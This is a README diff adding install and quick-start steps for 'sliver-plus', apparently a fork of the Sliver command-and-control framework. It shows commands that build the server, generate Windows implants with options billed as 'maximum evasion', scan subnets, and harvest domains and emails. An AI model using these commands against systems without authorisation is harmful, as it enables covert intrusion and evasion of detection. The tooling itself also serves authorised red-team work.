@@ -40,6 +40,118 @@ See [CHANGELOG.md](CHANGELOG.md) for detailed feature documentation and [RUNTIME
 
 ---
 
+## 🚀 Installation
+
+### Prerequisites
+
+- **Go 1.22+** (for building from source)
+- **Make** (for building)
+- **Git** (for cloning)
+
+### Quick Install from Source
+
+```bash
+# Clone the repository
+git clone https://github.com/rxid09672/sliver-plus.git
+cd sliver-plus
+
+# Build server and client
+make
+
+# The binaries will be in the root directory:
+# ./sliver-server (server)
+# ./sliver-client (client)
+```
+
+### Linux/macOS One-Liner Install
+
+```bash
+git clone https://github.com/rxid09672/sliver-plus.git && cd sliver-plus && make
+```
+
+### Runtime Dependencies (Optional)
+
+Sliver-Plus works out of the box, but to use the enhanced reconnaissance features, install these tools:
+
+#### **For Active Network Scanning (`hosts scan`)**
+```bash
+# Linux (Debian/Ubuntu)
+sudo apt install nmap
+
+# macOS
+brew install nmap
+
+# Windows
+choco install nmap
+```
+
+#### **For Passive OSINT (`loot recon`)**
+```bash
+# Subfinder (subdomain enumeration)
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+
+# theHarvester (email/OSINT gathering)
+pip3 install theHarvester
+```
+
+**Note:** These tools are only needed for running the respective commands. Sliver-Plus will display clear installation instructions if a tool is missing.
+
+See [RUNTIME_DEPENDENCIES.md](docs-sliver-plus/RUNTIME_DEPENDENCIES.md) for detailed installation guides including troubleshooting.
+
+---
+
+## 📚 Quick Start
+
+### 1. Start the Server
+
+```bash
+# First time setup (generates configs)
+./sliver-server
+
+# Or run as daemon
+./sliver-server daemon
+```
+
+### 2. Connect with Client
+
+```bash
+./sliver-client
+```
+
+### 3. Generate an Implant
+
+```bash
+# Basic implant
+sliver> generate --os windows --arch amd64 --mtls your-server-ip:8888
+
+# With metamorphic diversity (unique signatures)
+sliver> generate --os windows --mtls your-server-ip:8888 --diversity
+
+# With Vector Space Metamorphism (maximum evasion)
+sliver> generate --os windows --mtls your-server-ip:8888 --diversity --novel-techniques
+```
+
+### 4. Use Enhanced Recon Features
+
+```bash
+# Active network scanning
+sliver> hosts scan 192.168.1.0/24 -s -o
+
+# Passive OSINT
+sliver> loot recon domains example.com
+sliver> loot recon emails example.com
+```
+
+---
+
+## 📖 Documentation
+
+- **Sliver-Plus Features:** [CHANGELOG.md](CHANGELOG.md)
+- **Runtime Dependencies:** [docs-sliver-plus/RUNTIME_DEPENDENCIES.md](docs-sliver-plus/RUNTIME_DEPENDENCIES.md)
+- **Original Sliver Docs:** [sliver.sh/docs](https://sliver.sh/docs)
+
+---
+
 ## Original Sliver Information
 
 # v1.6.0 / `master`
